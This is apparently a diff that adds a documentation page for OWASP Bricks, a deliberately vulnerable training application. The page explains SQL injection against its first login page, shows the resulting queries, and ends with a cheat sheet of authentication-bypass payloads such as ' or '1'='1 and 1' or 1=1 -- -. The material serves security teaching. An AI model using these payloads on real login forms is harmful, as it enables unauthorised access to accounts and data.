@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width" />
+  <title>OWASP Bricks Login page #1</title>  
+  <!-- Included CSS Files (Uncompressed) -->
+  <!--
+  <link rel="stylesheet" href="../stylesheets/foundation.css">
+  -->  
+  <!-- Included CSS Files (Compressed) -->
+  <link rel="stylesheet" href="../stylesheets/foundation.min.css">
+  <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="../stylesheets/app.css">
+  <link rel="icon" href="../favicon.ico" type="image/x-icon">
+  <script src="../javascripts/modernizr.foundation.js"></script>
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <!-- Header and Nav -->
+
+  <div class="row">
+    <div class="three columns">
+      <h1><a href="../"><img src="../images/bricks.jpg" /></a></h1>
+    </div>
+    <div class="nine columns">
+      <ul class="nav-bar right">
+        <li><a href="../index.php">Home</a></li>
+		<li><a href="../download.html">Download</a></li>
+        <li><a href="../docs/">Docs</a></li>
+        <li><a href="http://owaspbricks.blogspot.com/">Blog</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- End Header and Nav -->
+  
+  <div class="row">
+    <div class="eight columns">
+
+	    <h4>Bricks Documentation</h4>
+      </div>
+      </div>
+	  
+	  
+  <div class="row">
+    <div class="twelve columns">
+    <div class="three columns" style="padding: 0 0px;">
+	<ul class="nav-bar vertical">
+  <li><a href="index.php">Getting started</a></li>
+  <li><a href="installation.html">Installation</a></li>
+  <li class="active has-flyout">
+    <a href="login-pages.html">Login pages</a>
+    <a href="login-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout">
+      <h5><a href="login-pages.html">Login pages</a></h5>
+      <div class="row">
+        <div class="six columns">
+          <div style="line-height:2.4;"><a href="login-1.html"><b>Login #1</b></a><br/></div>
+        </div>
+        <div class="six columns">
+          <div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+  <li class="has-flyout">
+    <a href="file-upload-pages.html">File upload pages</a>
+    <a href="file-upload-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout">
+      <h5><a href="file-upload-pages.html">File upload pages</a></h5>
+      <div class="row">
+        <div class="six columns">
+			<div style="line-height:2.4;"><a href="file-upload-1.html"><b>Upload #1</b></a></div>
+        </div>
+        <div class="six columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+  <li class="has-flyout">
+    <a href="content-pages.html">Content pages</a>
+    <a href="content-pages.html" class="flyout-toggle"><span> </span></a>
+    <div class="flyout" style="width: 400px;">
+      <h5><a href="content-pages.html">Content pages</a></h5>
+      <div class="row">
+        <div class="four columns">
+			<div style="line-height:2.4;"><a href="content-page-1.html"><b>Content #1</b></a><br/></div>
+        </div>
+        <div class="four columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+        <div class="four columns">
+			<div style="line-height:2.4;"></div>
+        </div>
+      </div>
+    </div>
+  </li>
+</ul>
+	
+	</div>
+	<div class="nine columns">	
+	<h4>Login page #1</h4>
+	<p>
+	<ul class="disc">
+	<li>Login page with user name and password verification</li>
+	<li>Both user name and password field are prone to code injection.</li>
+	</ul><br/>
+	<h5>Credentials for logging in normally</h5>
+	<table class="six">
+  <thead>
+    <tr>
+      <th>User name</th>
+      <th>Password</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>tom</td>
+      <td>tom</td>
+    </tr>
+    <tr>
+      <td>ron</td>
+      <td>ron</td>
+    </tr>
+  </tbody>
+  </table><br/>
+	<h5>SQL injection<br/><br/></h5>
+	<iframe width="560" height="315" src="http://www.youtube.com/embed/mCo6ajvBv50?rel=0" frameborder="0" allowfullscreen></iframe>
+	<h6>Executed SQL query when username is <span style="color:orange">tom</span> and password is <span style="color:orange">tom</span>:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <span style="color:blue">and</span> password=<span style="color:grey">'tom'</span><br/><br/>
+	When a user enters a user name and password, a SQL query is created and executed to search on the database to verify them. The above query searches in the users table where name is tom and password is tom. If matching entries are found, the user is authenticated.
+	</p>
+	<p>
+	In order to bypass this security mechanism, SQL code has to be injected on to the input fields. The code has to be injected in such a way that the SQL statement should generate a valid result upon execution. If the executed SQL query has errors in the syntax, it won't featch a valid result. So filling in random SQL commands and submitting the form will not always result in succesfull authentication.<br/><br/>
+	</p>
+	<p>
+	<h6>Executed SQL query when username is <span style="color:orange">tom</span> and password is a single quote:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <span style="color:blue">and</span> password=<span style="color:grey">'''</span><br/><br/>The above query is not going yield any results as it is not a valid query. If the web page is not filtering out the error messages, you will be able to see an error message on the page. The trick is not make the query valid by putting proper SQL commands on place.<br/><br/>
+	</p>
+	<p>
+	<h6>Executed SQL query when username is <span style="color:orange">tom</span> and password is <span style="color:orange">' or '1'='1</span>:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span><br/><br/>If the username is already known, the only thing to be bypassed is the password verification. So, the SQL commands should be fashioned in the similar way.</p>
+	<p>The <b>password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span></b> condition is always true, so the password verification never happens. It can also be said that the above statement is more or less equal to<br/><br/><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span>
+	</p>
+	<p>	
+	That is just one of the possibility. The actual exploit is limited only by the imagination of the tester. Let's see another possibility.<br/><br/>
+	</p>
+	<p>	
+	<h6>Executed SQL query when username is <span style="color:orange">tom</span> and password is <span style="color:orange">' or 1='1</span>:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:orange">1</span><span style="color:grey">='1'</span><br/>The <b>password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">1='1'</span></b> condition is also always true just like in the first case and thus bypasses the security.
+	</p>	
+	<p>The above two cases needed a valid username to be supplied. But that is not necesserily required since the username field is also vulnerable to SQL injection attacks.<br/><br/>
+	</p>	
+	<p>
+	<h6>Executed SQL query when username is <span style="color:orange">' or '1'='1</span> and password is <span style="color:orange">' or '1'='1</span>:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span> <span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span><br/><br/>The SQL query is crafted in such a way that both username and password verifications are bypassed. The above statement actually queries for all the users in the database and thus bypasses the security.<br/><br/></p>
+	<p>
+	<h6>Executed SQL query when username is <span style="color:orange">' or ' 1=1</span> and password is <span style="color:orange">' or ' 1=1</span>:</h6>
+	<span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <span style="color:blue">WHERE</span> name=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">' 1=1'</span> <span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">' 1=1'</span><br/><br/>The above query is also more or less similar to the previously executed query and is a possible way to get authenticated.</p>
+	<br/><p>
+	<h5>Cheat sheet</h5>
+	<table class="white">
+  <thead>
+    <tr>
+      <th>User name</th>
+      <th>Password</th>
+      <th>SQL Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>tom</td>
+      <td>tom</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">'tom'</span></td>
+    </tr>
+    <tr>
+      <td>tom</td>
+      <td>' or '1'='1</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span></td>
+    </tr>
+    <tr>
+      <td>tom</td>
+      <td>' or 1='1</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:orange">1</span><span style="color:grey">='1'</span></td>
+    </tr>
+    <tr>
+      <td>tom</td>
+      <td>1' or 1=1 -- -</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">'tom'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:orange">1=1</span><span style="color:green">-- -'</span></td>
+    </tr>
+    <tr>
+      <td>' or '1'='1</td>
+      <td>' or '1'='1</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">'1'='1'</span></td>
+    </tr>
+    <tr>
+      <td>' or ' 1=1</td>
+      <td>' or ' 1=1</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">' 1=1'</span> <br/><span style="color:blue">and</span> password=<span style="color:grey">''</span> <span style="color:blue">or</span> <span style="color:grey">' 1=1'</span></td>
+    </tr>
+    <tr>
+      <td>1' or 1=1 -- -</td>
+      <td>blah</td>
+      <td><span style="color:blue">SELECT</span> * <span style="color:blue">FROM</span> users <br/><span style="color:blue">WHERE</span> name=<span style="color:grey">'1'</span> <span style="color:blue">or</span> <span style="color:orange">1</span>=<span style="color:orange">1</span> <span style="color:green">-- -' <br/>and password='blah'</span></td>
+    </tr>
+  </tbody>
+  </table>
+	</p>
+    </div>
+    </div>
+  </div>
+  
+ 
+  <!-- Footer -->
+
+  <footer class="row">
+    <div class="twelve columns">
+      <hr />
+      <div class="row">
+        <div class="six columns">
+          <p>OWASP Bricks</p>
+        </div>
+        <div class="six columns">
+          <div class="right">
+           <a href="http://www.facebook.com/OWASPBricks"><img src="../images/Facebook.png"/></a>&nbsp;<a href="https://twitter.com/OWASPBricks"><img src="../images/Twitter.png"/></a>&nbsp;<a href="https://sourceforge.net/p/owaspbricks/"><img src="../images/Sourceforge.png"/></a>&nbsp;<a href="https://www.owasp.org/index.php/OWASP_Bricks"><img src="../images/owasp.png"/></a>&nbsp;<a href="http://gplus.to/OWASPBricks"><img src="../images/Google+.png"/></a>&nbsp;<a href="https://www.youtube.com/OWASPBricks"><img src="../images/YouTube.png"/></a>&nbsp;<a href="http://owaspbricks.blogspot.com/"><img src="../images/Blogger.png"/></a>
+		</div> 		
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  
+	
+	
+	
+  </div>
+
+  
+  
+  <!-- Included JS Files (Uncompressed) -->
+  <!--
+  
+  <script src="../javascripts/jquery.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.mediaQueryToggle.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.forms.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.reveal.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.orbit.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.navigation.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.buttons.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.tabs.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.tooltips.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.accordion.js"></script>
+  
+  <script src="../javascripts/jquery.placeholder.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.alerts.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.topbar.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.joyride.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.clearing.js"></script>
+  
+  <script src="../javascripts/jquery.foundation.magellan.js"></script>
+  
+  -->
+  
+  <!-- Included JS Files (Compressed) -->
+  <script src="../javascripts/jquery.js"></script>
+  <script src="../javascripts/foundation.min.js"></script>
+  
+  <!-- Initialize JS Plugins -->
+  <script src="../javascripts/app.js"></script>
+
+</body>
+</html>
